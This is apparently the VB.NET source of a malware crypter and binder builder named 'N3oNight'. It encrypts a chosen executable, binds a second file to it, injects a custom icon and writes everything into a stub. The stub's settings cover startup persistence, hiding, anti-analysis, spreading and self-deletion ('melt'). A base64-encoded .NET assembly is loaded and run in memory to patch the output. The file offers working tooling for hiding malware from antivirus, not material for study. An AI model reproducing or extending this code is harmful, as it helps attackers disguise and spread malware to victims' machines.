﻿Imports System.Text
Imports System.Runtime.InteropServices
Public Class Form1

    Private Sub GhostButton5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GhostButton5.Click
        Me.Close()
        Application.Exit()
    End Sub

    Private Sub GhostButton1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GhostButton1.Click
        Dim ofd As New OpenFileDialog : ofd.Filter = "Executables *.exe|*.exe" : If ofd.ShowDialog = Windows.Forms.DialogResult.OK Then GhostTextbox1.Text = ofd.FileName Else GhostTextbox1.Text = ""
    End Sub

    Private Sub GhostButton2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GhostButton2.Click
        GhostTextbox2.Text = random_key(22)
    End Sub

    Private Sub GhostButton3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GhostButton3.Click
        Dim ofd As New OpenFileDialog : If ofd.ShowDialog = Windows.Forms.DialogResult.OK Then GhostTextbox3.Text = ofd.FileName Else GhostTextbox3.Text = ""
    End Sub

    Private Sub GhostButton4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GhostButton4.Click
        Dim openIcon As New OpenFileDialog With {.DefaultExt = "ico", .Filter = "Icons|*.ico", .Title = "Open icon"}
        If openIcon.ShowDialog = Windows.Forms.DialogResult.OK Then
            GhostTextbox4.Text = openIcon.FileName
            Dim cusIcon As New Icon(openIcon.FileName)
            PictureBox1.Image = cusIcon.ToBitmap
        End If
    End Sub

    Private Sub GhostButton7_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GhostButton7.Click
        GhostTextbox7.Text = random_key(20)
        GhostTextbox8.Text = random_key(22)
        GhostTextbox9.Text = random_key(19)
        GhostTextbox10.Text = random_key(21)


    End Sub
    Dim bind As String
    Dim start, bind_chk, hid, antis, spread, melt As Boolean
    Dim bind_nam As String = Nothing
    Dim persistense, Rar As Boolean
    Private Sub GhostButton6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GhostButton6.Click
        Dim sfd As New SaveFileDialog
        sfd.Filter = "Executable Files (*.exe)|*.exe|Com Files (*.com)|*.com|Batch Files (*.bat)|*.bat|Program Information File (*.pif)|*.pif"
        If sfd.ShowDialog = Windows.Forms.DialogResult.OK Then
        End If

        Dim input As String = Convert.ToBase64String(Encoding.Default.GetBytes(StairsEncryption.Crypt(Encoding.Default.GetString(IO.File.ReadAllBytes(GhostTextbox1.Text)), "N3oNight")))

        If GhostTextbox3.Text = "Browse File To Bind" Then

        Else
            bind_chk = True
            bind = Convert.ToBase64String(Encoding.Default.GetBytes(StairsEncryption.Crypt(Encoding.Default.GetString(IO.File.ReadAllBytes(GhostTextbox3.Text)), "N3oNight")))
            bind_nam = IO.Path.GetFileName(GhostTextbox3.Text)
        End If

        Dim process As String = GhostTextbox6.Text

        If GhostCheckbox1.Checked = True Then
            start = True
        End If


        If GhostCheckbox2.Checked = True Then
            start = True
        End If

        If GhostCheckbox12.Checked = True Then
            persistense = True
        End If

        Dim start_name As String = GhostTextbox11.Text

        If GhostCheckbox4.Checked = True Then
            hid = True
        End If

        If GhostCheckbox5.Checked = True Then
            antis = True
        End If

        If GhostCheckbox6.Checked = True Then
            spread = True
        End If

        If GhostCheckbox7.Checked = True Then
            melt = True
        End If

        If GhostCheckbox11.Checked = True Then
            Rar = True
        End If

        ' IO.File.Copy(Application.StartupPath & "\N3oNight.exe", sfd.FileName)
        My.Computer.FileSystem.WriteAllBytes(sfd.FileName, My.Resources.eppy, False)



        If GhostTextbox4.Text = "Browse Icon To Use" Then
        Else
            IconChanger.InjectIcon(sfd.FileName, GhostTextbox4.Text)
        End If

        Dim Data As String = "XPfW2DM9UMKdB2ZJDJtX" & input & "XPfW2DM9UMKdB2ZJDJtX" & bind_chk & "XPfW2DM9UMKdB2ZJDJtX" & bind & "XPfW2DM9UMKdB2ZJDJtX" & bind_nam & "XPfW2DM9UMKdB2ZJDJtX" & process & "XPfW2DM9UMKdB2ZJDJtX" & start & "XPfW2DM9UMKdB2ZJDJtX" & start_name & "XPfW2DM9UMKdB2ZJDJtX" & hid & "XPfW2DM9UMKdB2ZJDJtX" & antis & "XPfW2DM9UMKdB2ZJDJtX" & spread & "XPfW2DM9UMKdB2ZJDJtX" & melt & "XPfW2DM9UMKdB2ZJDJtX" & persistense & "XPfW2DM9UMKdB2ZJDJtX" & Rar
        Dim Byteofdata As Byte() = Encoding.Default.GetBytes(Data)
        ' ResourceWriter.WriteResource(FileName, StringtoByte)
        System.Reflection.Assembly.Load(Convert.FromBase64String("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wwABAEABCQDjAAEAQAELAPcAAQAAAAAAAQAAAAAAAAAAAAAAAAAPAAAAAgAAAAAAAAAAAAAAAQAtAAAAAAACAAAAAAAAAAAAAAABAD0AAAAAAAgAAAAAAAAAAAAAAJcBpwMAAAAAAAAAAAEAAAAqAwAAAAAAV3JpdGVEYXRhLmRsbABXcml0ZURhdGEAPE1vZHVsZT4ARGF0YQBXcml0ZQBtc2NvcmxpYgBPYmplY3QAU3lzdGVtAE15U2V0dGluZ3MAV3JpdGUuTXkAQXBwbGljYXRpb25TZXR0aW5nc0Jhc2UAU3lzdGVtLkNvbmZpZ3VyYXRpb24AUG93ZXJlZEJ5QXR0cmlidXRlAFNtYXJ0QXNzZW1ibHkuQXR0cmlidXRlcwBBdHRyaWJ1dGUAAQAuY3RvcgBVcGRhdGVSZXNvdXJjZQBrZXJuZWwzMi5kbGwAAgADAEJlZ2luVXBkYXRlUmVzb3VyY2UARW5kVXBkYXRlUmVzb3VyY2UATjNvTmlnaHQAZmlsZW5hbWUAYnl0ZXMALmNjdG9yAHMARGVmYXVsdABBc3NlbWJseURlc2NyaXB0aW9uQXR0cmlidXRlAFN5c3RlbS5SZWZsZWN0aW9uAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBHdWlkQXR0cmlidXRlAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBDb21WaXNpYmxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAENvbXBpbGVyR2VuZXJhdGVkQXR0cmlidXRlAEdlbmVyYXRlZENvZGVBdHRyaWJ1dGUAU3lzdGVtLkNvZGVEb20uQ29tcGlsZXIARWRpdG9yQnJvd3NhYmxlQXR0cmlidXRlAFN5c3RlbS5Db21wb25lbnRNb2RlbABFZGl0b3JCcm93c2FibGVTdGF0ZQBXcml0ZS5SZXNvdXJjZXMucmVzb3VyY2VzAEdDSGFuZGxlAEFkZHJPZlBpbm5lZE9iamVjdABGcmVlAFJ1bnRpbWVIZWxwZXJzAEdldE9iamVjdFZhbHVlAEFsbG9jAEdDSGFuZGxlVHlwZQBDb252ZXJ0AFRvVUludDMyAE1pY3Jvc29mdC5WaXN1YWxCYXNpYwBQcm9qZWN0RGF0YQBNaWNyb3NvZnQuVmlzdWFsQmFzaWMuQ29tcGlsZXJTZXJ2aWNlcwBTZXRQcm9qZWN0RXJyb3IARXhjZXB0aW9uAENsZWFyUHJvamVjdEVycm9yAFNldHRpbmdzQmFzZQBTeW5jaHJvbml6ZWQAAAAAE04AMwBPAF8ATgBJAEcASABUAAAHOQAxADEAAAAAAJ26ISDZbk5BlMcZ5CjcBgwACLd6XFYZNOCJAwYSDAMgAAEEAAEYHAkABgIYDg4HGAkFAAIYDgIBAgUAAgIYAgYAAgIOHQUDAAABBAAAEgwEIAEBDgQIABIMJgEAIVBvd2VyZWQgYnkgU21hcnRBc3NlbWJseSA2LjYuMy40MQAABQEAAAAADAEABzEuMC4wLjAAAA4BAAlXcml0ZURhdGEAAAQgAQEICAEACAAAAAAAHgEAAQBUAhZXcmFwTm9uRXhjZXB0aW9uVGhyb3dzASkBACRmNzcxYjQ4OC1iZGVkLTRjN2UtYjVjOS03OThjYmFmYzdlMDMAAAQgAQECFwEAEkNvcHlyaWdodCDCqSAgMjAxMgAABAEAAAAFIAIBDg5ZAQBLTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5FZGl0b3JzLlNldHRpbmdzRGVzaWduZXIuU2V0dGluZ3NTaW5nbGVGaWxlR2VuZXJhdG9yCDEwLjAuMC4wAAAFIAEBEUkIAQACAAAAAAADIAAYBAABHBwHAAIRTRwRVQYHAxFNGBgEAAEJCAiwP19/EdUKOgUAAQESYQoHBgIdBRgYAhJhBgABEmUSZQQHARIMAAAAtAAAAM7K774BAAAAkQAAAGxTeXN0ZW0uUmVzb3VyY2VzLlJlc291cmNlUmVhZGVyLCBtc2NvcmxpYiwgVmVyc2lvbj0yLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkjU3lzdGVtLlJlc291cmNlcy5SdW50aW1lUmVzb3VyY2VTZXQCAAAAAAAAAAAAAABQQURQQURQtAAAAIQsAAAAAAAAAAAAAJosAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAACMLAAAAAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwA/yUAIEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAwAAACoPAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=")).GetType("Write.Data").GetMethod("N3oNight").Invoke(Nothing, New Object() {sfd.FileName, Byteofdata})
        'Data1.N3oNight(sfd.FileName, Byteofdata)
    End Sub

    Public Shared Function random_key(ByVal lenght As Integer) As String
        Randomize()
        Dim s As New System.Text.StringBuilder("")
        Dim b() As Char = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function
    'Simple encryption for use
    'coded by Miharbi-Dono from HF.
    'Give Credits. don't just delete this comment, it won't hurt.

    Public Class StairsEncryption
        Public Shared Function Crypt(ByVal Data As String, ByVal key As String) As String
            Return Encoding.Default.GetString(Crypt1(Encoding.Default.GetBytes(Data), Encoding.Default.GetBytes(key)))
        End Function
        Public Shared Function Crypt1(ByVal Data() As Byte, ByVal key() As Byte) As Byte()
            For i = 0 To (Data.Length * 2) + key.Length
                Data(i Mod Data.Length) = CByte(CInt((Data(i Mod Data.Length)) + CInt(Data((i + 1) Mod Data.Length))) Mod 256) Xor key(i Mod key.Length)
            Next
            Return Data
        End Function
    End Class

    Public Shared Function C(ByVal byt As String, Optional ByVal p As String = Nothing) As Byte()
        Dim bytes() As Byte = System.Text.Encoding.Default.GetBytes(byt)
        Dim key() As Byte
        If p = Nothing Then
            key = New Byte() {99}
        Else
            key = System.Text.Encoding.Default.GetBytes(p)
        End If
        Dim s(255) As Byte
        Dim i As Integer
        For i = 0 To s.Length - 1
            s(i) = CByte(i)
        Next
        Dim j As Integer
        For i = 0 To s.Length - 1
            j = (j + key(i Mod key.Length) + s(i)) And 255
            Dim temp As Byte = s(i)
            s(i) = s(j)
            s(j) = temp
        Next
        i = 0 : j = 0
        Dim output(bytes.Length - 1) As Byte
        Dim k As Integer
        For k = 0 To bytes.Length - 1
            i = (i + 1) And 255
            j = (j + s(i)) And 255
            Dim temp As Byte = s(i)
            s(i) = s(j)
            s(j) = temp
            output(k) = s((CType(s(i), Integer) + s(j)) And 255) Xor bytes(k)
        Next
        Return output
    End Function

    Public Shared Function C2(ByVal B As String, ByVal D As String) As Byte()
        Dim H = New System.Security.Cryptography.MD5CryptoServiceProvider()
        Dim T = New System.Security.Cryptography.TripleDESCryptoServiceProvider()
        T.Key = H.ComputeHash(System.Text.Encoding.Default.GetBytes("%GUID%"))
        T.Mode = System.Security.Cryptography.CipherMode.ECB
        T.Padding = System.Security.Cryptography.PaddingMode.PKCS7
        Dim CT As System.Security.Cryptography.ICryptoTransform = T.CreateDecryptor()
        Return CT.TransformFinalBlock(Convert.FromBase64String(B), 0, Convert.FromBase64String(B).Length)
    End Function

    Private Sub RandomPool1_CharacterSelection(ByVal s As System.Object, ByVal c As System.Char) Handles RandomPool1.CharacterSelection
        GhostTextbox5.Text = c + GhostTextbox5.Text
    End Sub




    Public Seal As License

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
       
        GhostProgressbar2.Value = GhostProgressbar2.Value + 1
        If GhostProgressbar2.Value = 100 Then
            Timer1.Stop()
        End If
    End Sub

    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        If GhostProgressbar2.Value = 1 Then
            Label16.Text = "B"
        Else
            If GhostProgressbar2.Value = 2 Then
                Label16.Text = "Bu"
            Else
                If GhostProgressbar2.Value = 3 Then
                    Label16.Text = "Bui"
                Else
                    If GhostProgressbar2.Value = 4 Then
                        Label16.Text = "Buil"
                    Else
                        If GhostProgressbar2.Value = 5 Then
                            Label16.Text = "Built"
                        Else
                            If GhostProgressbar2.Value = 6 Then
                                Label16.Text = "Built B"
                            Else
                                If GhostProgressbar2.Value = 7 Then
                                    Label16.Text = "Built By"
                                Else
                                    If GhostProgressbar2.Value = 8 Then
                                        Label16.Text = "Built By N"
                                    Else
                                        If GhostProgressbar2.Value = 9 Then
                                            Label16.Text = "Built By Ne"
                                        Else
                                            If GhostProgressbar2.Value = 10 Then
                                                Label16.Text = "Built By Nex"
                                            Else
                                                If GhostProgressbar2.Value = 11 Then
                                                    Label16.Text = "Built By Nexu"
                                                Else
                                                    If GhostProgressbar2.Value = 12 Then
                                                        Label16.Text = "Built By Nexus"
                                                    Else

                                                    End If
                                                End If
                                            End If
                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If
                End If
            End If
        End If
    End Sub

    Private Sub Label16_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Label16.Click

    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

    End Sub
End Class
'make something load the label by button before run like on HWID